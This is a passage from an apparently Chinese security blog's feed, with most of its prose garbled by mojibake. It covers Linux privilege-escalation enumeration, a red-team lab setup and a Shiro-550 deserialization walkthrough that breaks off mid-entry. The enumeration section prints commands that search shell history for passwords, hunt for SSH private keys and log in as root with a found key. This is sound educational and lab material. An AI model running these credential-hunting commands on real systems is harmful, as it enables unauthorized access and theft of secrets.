id="è½¯ä»¶ä¿¡æ¯æšä¸¾">è½¯ä»¶ä¿¡æ¯æšä¸¾</span></h1><p><strong>CentOSæŸ¥çœ‹å·²å®‰è£…ç¨‹åº</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum list installed<br></code></pre></td></tr></table></figure><p><strong>Debianã€UbuntuæŸ¥çœ‹å·²å®‰è£…ç¨‹åº</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -l<br>apt list<br></code></pre></td></tr></table></figure><h1><span id="æ–‡ä»¶æšä¸¾">æ–‡ä»¶æšä¸¾</span></h1><p><strong>æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦å®‰è£…äº†æ–‡ä»¶ä¼ è¾“ã€Shellåå¼¹ã€ä»£ç ç¼–è¯‘ç­‰å·¥å…·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> nc 2&gt;/dev/null;<span class="hljs-built_in">which</span> netcat 2&gt;/dev/null;<span class="hljs-built_in">which</span> wget 2&gt;/dev/null;<span class="hljs-built_in">which</span> nmap 2&gt;/dev/null;<span class="hljs-built_in">which</span> gcc 2&gt;/dev/null;<span class="hljs-built_in">which</span> curl 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶æƒé™</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /etc/passwd 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/group 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/profile 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/shadow 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç‰¹æ®Šæƒé™æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹SUIDæƒé™æ–‡ä»¶</span><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹SGIDæƒé™æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å¯å†™æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#æŸ¥æ‰¾ä¸å±äºå½“å‰ç”¨æˆ·ä½†æ˜¯å½“å‰ç”¨æˆ·å¯å†™çš„æ–‡ä»¶(æ’é™¤/proc/å’Œ/sys/ç›®å½•ä¸‹çš„æ–‡ä»¶)</span><br>find / -writable ! -user `<span class="hljs-built_in">whoami</span>` -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-comment">#å¦ä¸€ç§æ–¹å¼</span><br>find / -perm -2 -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æŒ‡å®šæ‰©å±•åæ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name *.bak -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>æŸ¥æ‰¾å…³é”®å­—æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾æ‰©å±•åä¸º.phpçš„æ–‡ä»¶ï¼Œæœç´¢å¹¶åˆ—å‡ºæ–‡ä»¶å†…å®¹åŒ…å«passçš„è¡Œï¼Œå¹¶è¾“å‡ºè¡Œå·</span><br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å†å²å‘½ä»¤è®°å½•æ–‡ä»¶</strong></p><p>æŸ¥æ‰¾å¯èƒ½å­˜åœ¨çš„å†å²å‘½ä»¤è®°å½•æ–‡ä»¶ï¼Œå¦‚Bashå†å²è®°å½•æ–‡ä»¶ã€MySQLå†å²è®°å½•æ–‡ä»¶ç­‰ç­‰ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al ~/.*_history 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511103.png" alt="image-20240625211315620"></p><p>å…¶ä¸­bash_historyè®°å½•å†å²å‘½ä»¤ï¼Œæˆ‘ä»¬å¯èƒ½ä»ä¸­è·å¾—ä¸€äº›æœåŠ¡çš„å‡­æ®ä¹‹ç±»çš„é‡è¦ä¿¡æ¯ã€‚</p><p><strong>æŸ¥çœ‹éšè—æ–‡ä»¶</strong></p><p>æ¯”å¦‚æœ‰äº›ç®¡ç†å‘˜ä¼šå°†éš¾è®°å¿†çš„å¯†ç é€šè¿‡éšè—æ–‡ä»¶çš„æ–¹å¼ä¿å­˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡bashå†å²å‘½ä»¤æ–‡ä»¶è¿›è¡Œæœç´¢æŸ¥çœ‹å¹¶è·å–ä¸€äº›æ•æ„Ÿä¿¡æ¯</p><p>è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹æŸ¥æ‰¾å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-built_in">cat</span> ~/.bash_history | grep -i passw <span class="hljs-comment">#åœ¨å†å²å‘½ä»¤æœç´¢æŒ‡å®šå­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹é…ç½®æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*.ovpn&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null <span class="hljs-comment">#.ovpnæ˜¯è™šæ‹Ÿä¸“ç”¨ç½‘ç»œçš„é…ç½®æ–‡ä»¶æ‰©å±•åï¼Œå³vpn</span><br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å»çœ‹çœ‹é‡Œé¢çš„æ–‡ä»¶æœ‰ä»€ä¹ˆä¿¡æ¯</p><p><strong>æŸ¥çœ‹SSHç§é’¥æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name id_rsa 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>å¦‚æœèƒ½æ‰¾åˆ°çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¯¥æ–‡ä»¶å¤åˆ¶åˆ°kaliï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤ä»¥rootç”¨æˆ·ç™»é™†ç›®æ ‡æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa <span class="hljs-comment">#è®¾ç½®æƒé™</span><br>ssh -i id_rsa root@&lt;ç›®æ ‡ä¸»æœºçš„ip&gt; <span class="hljs-comment">#ä½¿ç”¨id_rsaæ–‡ä»¶è¿æ¥</span><br></code></pre></td></tr></table></figure><h1><span id="ä¿¡æ¯æœé›†è¾…åŠ©å·¥å…·">ä¿¡æ¯æœé›†è¾…åŠ©å·¥å…·</span></h1><p><strong>Metasploitæ¨¡å—</strong></p><p>åœ¨Metasoloitçš„post&#x2F;linux&#x2F;gather&#x2F;æ–‡ä»¶å¤¹ä¸‹æœ‰å¾ˆå¤šé’ˆå¯¹æœåŠ¡å™¨ä¿¡æ¯æœé›†çš„åæ¸—é€æ¨¡å—ã€‚</p><p><strong>å¼€æºè„šæœ¬æœé›†ä¿¡æ¯</strong></p><p>æ¯”å¦‚LinEnumï¼Œå®ƒå¯ä»¥è·å–æœåŠ¡å™¨çš„å„ç§ä¿¡æ¯ï¼Œå…¶å®è¯¥è„šæœ¬å°±æ˜¯å¤šæ¡å‘½ä»¤çš„é›†åˆï¼Œä¹Ÿå¯ä»¥è‡ªå·±å†™ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;æœåŠ¡å™¨ä¿¡æ¯æšä¸¾&quot;&gt;æœåŠ¡å™¨ä¿¡æ¯æšä¸¾&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;åˆ¤æ–­æ˜¯å¦è™šæ‹ŸåŒ–&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;c</summary>
      
    
    
    
    <category term="Linux" scheme="https://clowsman.github.io/categories/Linux/"/>
    
    
    <category term="ææƒ" scheme="https://clowsman.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºäºŒ</title>
    <link href="https://clowsman.github.io/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
    <id>https://clowsman.github.io/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/</id>
    <published>2024-06-22T09:29:33.000Z</published>
    <updated>2024-07-15T06:53:49.709Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</span></h1><p><strong>ç¯å¢ƒè¯´æ˜</strong></p><p>å†…ç½‘ç½‘æ®µï¼š10.10.10.1&#x2F;24</p><p>DMZç½‘æ®µï¼š192.168.111.1&#x2F;24</p><p>æµ‹è¯•æœºåœ°å€ï¼š192.168.111.1ï¼ˆWindowsï¼‰ï¼Œ192.168.111.11ï¼ˆLinuxï¼‰</p><p>é˜²ç«å¢™ç­–ç•¥ï¼ˆç­–ç•¥è®¾ç½®è¿‡åï¼Œæµ‹è¯•æœºåªèƒ½è®¿é—®192æ®µåœ°å€ï¼Œæ¨¡æ‹Ÿå…¬ç½‘è®¿é—®ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deny all tcp portsï¼š10.10.10.1<br>allow all tcp portsï¼š10.10.10.0/24<br></code></pre></td></tr></table></figure><p><strong>é…ç½®ä¿¡æ¯</strong></p><p><strong>DC</strong></p><p>IPï¼š10.10.10.10 OSï¼šWindows 2012(64)</p><p>åº”ç”¨ï¼šADåŸŸ</p><p><strong>WEB</strong></p><p>IP1ï¼š10.10.10.80 IP2ï¼š192.168.111.80 OSï¼šWindows 2008(64)</p><p>åº”ç”¨ï¼šWeblogic 10.3.6 MSSQL 2008</p><p><strong>PC</strong></p><p>IP1ï¼š10.10.10.201 IP2ï¼š192.168.111.201 OSï¼šWindows 7(32)</p><p>åº”ç”¨ï¼š</p><p><strong>æ”»å‡»æœº</strong></p><p>IPï¼š192.168.111.1 OSï¼šWindows 10(64)</p><p>IPï¼š192.168.111.11 OSï¼šParrot(64)</p><p><img src="http://cdn.clown2024.cn/202407151453562.png" alt="image-20240622210728382"></p><p><img src="http://cdn.clown2024.cn/202407151453563.png" alt="image-20240622214931742"></p><h1><span id="è€ƒç‚¹æè¿°">è€ƒç‚¹æè¿°</span></h1><p>æœ¬æ¬¡çº¢é˜Ÿç¯å¢ƒä¸»è¦Access Tokenåˆ©ç”¨ã€WMIåˆ©ç”¨ã€åŸŸæ¼æ´åˆ©ç”¨SMB relayï¼ŒEWS relayï¼ŒPTT(PTC)ï¼ŒMS14-068ï¼ŒGPPï¼ŒSPNåˆ©ç”¨ã€é»„é‡‘ç¥¨æ®&#x2F;ç™½é“¶ç¥¨æ®&#x2F;Sid History&#x2F;MOFç­‰æ”»é˜²æŠ€æœ¯ã€‚å…³äºé¶åœºç»Ÿä¸€ç™»å½•å¯†ç ï¼š1qaz@WSX</p><ol><li>Bypass UAC</li><li>Windowsç³»ç»ŸNTLMè·å–ï¼ˆç†è®ºçŸ¥è¯†ï¼šWindowsè®¤è¯ï¼‰</li><li>Access Tokenåˆ©ç”¨ï¼ˆMSSQLåˆ©ç”¨ï¼‰</li><li>WMIåˆ©ç”¨</li><li>ç½‘é¡µä»£ç†ï¼ŒäºŒå±‚ä»£ç†ï¼Œç‰¹æ®Šåè®®ä»£ç†ï¼ˆDNSï¼ŒICMPï¼‰</li><li>åŸŸå†…ä¿¡æ¯æ”¶é›†</li><li>åŸŸæ¼æ´åˆ©ç”¨ï¼šSMB relayï¼ŒEWS relayï¼ŒPTT(PTC)ï¼ŒMS14-068ï¼ŒGPPï¼ŒSPNåˆ©ç”¨</li><li>åŸŸå‡­è¯æ”¶é›†</li><li>åé—¨æŠ€æœ¯ï¼ˆé»„é‡‘ç¥¨æ®&#x2F;ç™½é“¶ç¥¨æ®&#x2F;Sid History&#x2F;MOFï¼‰</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ç¯å¢ƒé…ç½®&quot;&gt;ç¯å¢ƒé…ç½®&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;ç¯å¢ƒè¯´æ˜&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å†…ç½‘ç½‘æ®µï¼š10.10.10.1&amp;#x2F;24&lt;/p&gt;
&lt;p&gt;DMZç½‘æ®µï¼š192.168.111.1&amp;#x2F;24&lt;/p&gt;
&lt;p&gt;æµ‹è¯•æœºåœ°å€ï¼š</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Shiroååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-06-11T12:17:23.000Z</published>
    <updated>2024-08-17T07:50:27.297Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="shiroä»‹ç»">Shiroä»‹ç»</span></h1><p>ç›´æ¥é—®kimiç»™å‡ºçš„å¤§è‡´ä»‹ç»</p><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæä¾›äº†è®¤è¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚å®ƒè¢«è®¾è®¡ä¸ºæ˜“äºç†è§£ä¸”æ˜“äºä½¿ç”¨ï¼ŒåŒæ—¶æä¾›äº†å¼ºå¤§çš„å®‰å…¨æ€§ã€‚ä»¥ä¸‹æ˜¯Shiroçš„ä¸€äº›å…³é”®ç‰¹æ€§ï¼š</p><ol><li><strong>è®¤è¯ï¼ˆAuthenticationï¼‰</strong>ï¼šShiroæä¾›äº†å¤šç§è®¤è¯æ–¹å¼ï¼ŒåŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç ã€OAuthã€LDAPç­‰ã€‚</li><li><strong>æˆæƒï¼ˆAuthorizationï¼‰</strong>ï¼šShiroå…è®¸ä½ å®šä¹‰æƒé™å’Œè§’è‰²ï¼Œå¹¶æ ¹æ®è¿™äº›å®šä¹‰æ¥æ§åˆ¶ç”¨æˆ·å¯¹èµ„æºçš„è®¿é—®ã€‚</li><li><strong>åŠ å¯†ï¼ˆCryptographyï¼‰</strong>ï¼šShiroæä¾›äº†ä¸€å¥—åŠ å¯†å·¥å…·ï¼Œå¯ä»¥ç”¨äºå®‰å…¨åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ã€‚</li><li><strong>ä¼šè¯ç®¡ç†ï¼ˆSession Managementï¼‰</strong>ï¼šShiroå¯ä»¥ç®¡ç†Webå’ŒéWebç¯å¢ƒä¸­çš„ä¼šè¯ã€‚</li><li><strong>Webæ”¯æŒ</strong>ï¼šShiroæä¾›äº†å¯¹Webåº”ç”¨çš„å†…ç½®æ”¯æŒï¼Œå¯ä»¥è½»æ¾é›†æˆåˆ°Servletã€JSPç­‰WebæŠ€æœ¯ä¸­ã€‚</li><li><strong>ç¼“å­˜ï¼ˆCachingï¼‰</strong>ï¼šShiroå†…ç½®äº†ç¼“å­˜æœºåˆ¶ï¼Œå¯ä»¥æé«˜è®¤è¯å’Œæˆæƒè¿‡ç¨‹çš„æ€§èƒ½ã€‚</li><li><strong>ä¼ä¸šçº§å®‰å…¨</strong>ï¼šShiroçš„è®¾è®¡è€ƒè™‘äº†ä¼ä¸šçº§åº”ç”¨çš„éœ€æ±‚ï¼Œæä¾›äº†çµæ´»çš„å®‰å…¨ç­–ç•¥å’Œé›†æˆç‚¹ã€‚</li><li><strong>æ˜“äºé›†æˆ</strong>ï¼šShiroå¯ä»¥è½»æ¾é›†æˆåˆ°ç°æœ‰çš„Javaåº”ç”¨ä¸­ï¼Œæ— è®ºæ˜¯å¤§å‹ä¼ä¸šåº”ç”¨è¿˜æ˜¯å°å‹é¡¹ç›®ã€‚</li><li><strong>å¯æ‰©å±•æ€§</strong>ï¼šShiroçš„æ¶æ„å…è®¸å¼€å‘è€…æ ¹æ®éœ€è¦æ‰©å±•å…¶åŠŸèƒ½ï¼Œä¾‹å¦‚è‡ªå®šä¹‰è®¤è¯å’Œæˆæƒç­–ç•¥ã€‚</li><li><strong>ç¤¾åŒºæ”¯æŒ</strong>ï¼šä½œä¸ºApacheè½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€éƒ¨åˆ†ï¼ŒShiroæ‹¥æœ‰æ´»è·ƒçš„ç¤¾åŒºå’ŒæŒç»­çš„æ›´æ–°ã€‚</li></ol><h1><span id="shrioç¯å¢ƒæ­å»º">Shrioç¯å¢ƒæ­å»º</span></h1><p>å¯ä»¥ç›´æ¥ä»githubä¸Šé¢å°†ä»£ç cloneåˆ°æœ¬åœ°ï¼š<a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p><p>ç„¶ååˆ‡æ¢å›1.2.4çš„ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬å°±æ˜¯shiro550çš„æ¼æ´</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:apache/shiro.git<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘shiro&#x2F;samples&#x2F;webç›®å½•ä¸‹çš„pom.xml,å°†jstlçš„ç‰ˆæœ¬ä¿®æ”¹ä¸º1.2ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151444228.png" alt="image-20240611233305207"></p><p>ç„¶åé…ç½®TomcatæœåŠ¡å™¨å°†ç¯å¢ƒè·‘èµ·æ¥å³å¯ï¼Œè®°å¾—æ·»åŠ ä¸€ä¸ª<strong>samples_web_war</strong>å·¥ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151444229.png" alt="image-20240611233723956"></p><p><img src="http://cdn.clown2024.cn/202407151444230.png" alt="image-20240611233734929"></p><p>ç¯å¢ƒæ­å»ºå’Œæ¼æ´åˆ†æéƒ½å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiroååºåˆ—åŒ–æ¼æ´ç¬”è®°ä¸€ï¼ˆåŸç†ç¯‡ï¼‰ (changxia3.com)</a></p><p>æ€ªäº†è¿‡ä¸¤å¤©è¿™ç¯å¢ƒçªç„¶å°±å‡ºé”™äº†</p><p>emmmè¿™é‡Œå¯èƒ½éœ€è¦é…ç½®ä¸€ä¸‹<strong>tomcat&#x2F;conf&#x2F;server.xml</strong>æ–‡ä»¶ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p><img src="http://cdn.clown2024.cn/202407151444231.png" alt="image-20240613235256764"></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/seeeeeeeeeee/article/details/124724396">https://blog.csdn.net/seeeeeeeeeee/article/details/124724396</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Connector</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8088&quot;</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">URIEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">connectionTimeout</span>=<span class="hljs-string">&quot;20000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">redirectPort</span>=<span class="hljs-string">&quot;8443&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">maxParameterCount</span>=<span class="hljs-string">&quot;1000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedPathChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedQueryChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               /&gt;</span><br></code></pre></td></tr></table></figure><p>è¯´æ˜¯æ–°ç‰ˆtomcatè¯·æ±‚ä¸å…è®¸ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œè¿™é‡Œå°±æ”¾è¡Œä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œä½†æ”¹äº†ä¹‹åè°·æ­Œè¿˜æ˜¯ä¸è¡Œï¼Œedgeæ”¹æˆhttpå°±å¯ä»¥äº†</p><p>åæ¥æ‰¾äº†åŠå¤©æ‰¾ä¸€ä¸ªæ–¹æ³•ç»ˆäºèƒ½è§£å†³äº†ï¼š<a href="https://blog.csdn.net/qq_69576997/article/details/136731424">https://blog.csdn.net/qq_69576997/article/details/136731424</a></p><p>è°·æ­Œæµè§ˆå™¨urlè¾“å…¥ï¼šchrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>edgeæµè§ˆå™¨urlè¾“å…¥ï¼šedge:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>ç„¶ååœ¨æœ€åä¸€è¡Œçš„<strong>Delete domain security policies</strong>ä¸­è¾“å…¥localhostï¼Œç‚¹å‡»deleteï¼Œç„¶åé‡å¯tomcatå°±å¯ä»¥äº†</p><p><img src="http://cdn.clown2024.cn/202407151444232.png" alt="image-20240614132940906"></p><p>éº»äº†è¿™äº›ç¯å¢ƒé…ç½®ã€‚ã€‚ã€‚</p><h1><span id="shiro550æ¼æ´">Shiro550æ¼æ´</span></h1><p>Shiro550çš„æ¼æ´æ˜¯å› ä¸ºå…¶å­˜åœ¨å›ºå®škeyåŠ å¯†çš„åŸå› </p><h2><span id="å¯»æ‰¾å›ºå®škey">å¯»æ‰¾å›ºå®škey</span></h2><p>æˆ‘ä»¬è¿™é‡Œä»æºç å…¥æ‰‹æ‰¾åˆ°å…¶å›ºå®škey</p><p>Shiroåœ¨ç™»é™†æ˜¯å‹¾é€‰äº†rememberMeé€‰é¡¹å°±ä¼šè®¾ç½®ä¸€ä¸ªrememberMeçš„cookie</p><p><img src="http://cdn.clown2024.cn/202407151444233.png" alt="image-20240611234659707"></p><p><img src="http://cdn.clown2024.cn/202407151444234.png" alt="image-20240611234718498"></p><p>ä¸”è§£ç çš„æµç¨‹å°±æ˜¯<strong>base64è§£ç &#x3D;ã€‹AESè§£å¯†&#x3D;ã€‹ååºåˆ—åŒ–</strong></p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥å»æºç æœç´¢å¯¹åº”çš„å‡½æ•°ï¼Œå¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹Cookieå…³é”®å­—</p><p>å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªCookieRememberMeMangerå‡½æ•°ï¼Œè¿™åå­—å°±å¾ˆæ˜æ˜¾äº†</p><p><img src="http://cdn.clown2024.cn/202407151444235.png" alt="image-20240612000131474"></p><p>ç„¶åé‡Œé¢æœ‰å¯¹cookieå¤„ç†çš„å¾ˆå¤šå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¹‹ç±»ç›¸å…³çš„æ–¹æ³•ï¼Œè¿™é‡Œå…ˆæ‰¾ä¸€ä¸ªååºåˆ—åŒ–ç›¸å…³çš„å‡½æ•°ï¼Œç„¶åå¾€ä¸Šå¯»æ‰¾è°ƒç”¨é“¾ï¼Œæ‰¾åˆ°ä»–çš„å›ºå®škey</p><p><img src="http://cdn.clown2024.cn/202407151444236.png" alt="image-20240613221027529"></p><p>è¿™é‡Œå°±æ˜¯è·å–åºåˆ—åŒ–å†…å®¹ååºåˆ—åŒ–ï¼Œç„¶åbase64è§£ç ï¼Œè¿”å›çš„å¯¹åº”AESåŠ å¯†çš„å†…å®¹</p><p>å¾€ä¸Šæ‰¾è°ƒç”¨æ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444237.png" alt="image-20240613221343146"></p><p>è¿™é‡Œè¿›è¡Œäº†convertè½¬æ¢äº†ä¸€ä¸‹ï¼Œè¿™é‡Œå‡½æ•°å†å¾€ä¸Šæ‰¾å·²ç»æ˜¯ä¸€äº›æ ¡éªŒç›¸å…³çš„åŠŸèƒ½äº†ï¼Œé‚£å°±æ˜¯è¿™ä¸ªå‡½æ•°å·²ç»å®Œæˆäº†è§£å¯†ï¼Œè·Ÿè¿›å»å‡½æ•°çœ‹çœ‹</p><p><img src="http://cdn.clown2024.cn/202407151444238.png" alt="image-20240613221819479"></p><p>æœç„¶ï¼Œé‡Œé¢è¿›è¡Œäº†è§£å¯†ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–ä¹‹åè¿”å›</p><p>ä»å…¶ä¸­çš„å‡½æ•°åŠŸèƒ½æœ€ç»ˆè·Ÿè¸ªä¸‹å»å¯ä»¥åœ¨<strong>AbstractRememberMeManager</strong>è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ‰¾åˆ°å›ºå®škeyçš„èµ‹å€¼</p><p><img src="http://cdn.clown2024.cn/202407151444239.png" alt="image-20240612001639914"></p><p><img src="http://cdn.clown2024.cn/202407151444240.png" alt="image-20240612001655002"></p><p>å¯ä»¥çŸ¥é“å…¶å¯†é’¥æ˜¯å›ºå®šå­—ç¬¦ä¸²çš„base64è§£ç å¾—åˆ°</p><p>çŸ¥é“äº†å›ºå®šå¯†é’¥ä¹‹åæ„é€ å¯¹åº”çš„rememberMeå­—ç¬¦ä¸²å°±å¾ˆç®€å•äº†ï¼ŒAESåŠ å¯†çš„è„šæœ¬å¯ä»¥ç½‘ä¸Šæ‰¾ä¸€ä¸‹</p><h2><span id="æ‰“ccé“¾">æ‰“ccé“¾</span></h2><p>ä¸€èˆ¬shiroéƒ½ä¼šæœ‰ccçš„åŒ…</p><p><img src="http://cdn.clown2024.cn/202407151444241.png" alt="image-20240612001947670"></p><p>ä½†æ˜¯ä¸ä¸€å®šå¯ä»¥æ‰“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ’ä»¶åˆ†æä¸€ä¸‹ä¾èµ–å…³ç³»</p><p><img src="http://cdn.clown2024.cn/202407151444242.png" alt="image-20240612002101256"></p><p>è¢«æ ‡äº†testçš„è¿è¡Œæ—¶éƒ½ä¸ä¼šè¢«ç¼–è¯‘ï¼Œæ‰€ä»¥ä¸€èˆ¬çº¿ä¸Šçš„æ—¶å€™éƒ½æ˜¯æ‰“ä¸é€šçš„ï¼Œä¸è¿‡è¿™é‡Œçš„åŸå› æ˜¯æ²¡æœ‰ä»£ç å»ä½¿ç”¨è¿™ä¸ªä¾èµ–ï¼Œæ²¡æœ‰importå®ƒã€‚</p><p><strong>è¿™é‡ŒåŸç”Ÿshiroæ²¡æœ‰è‡ªå¸¦ccä¾èµ–</strong></p><p>è¿™é‡ŒåŠ ä¸€ä¸ª3.2.1çš„ç‰ˆæœ¬</p><figure class="highlight xml"><table><tr><td 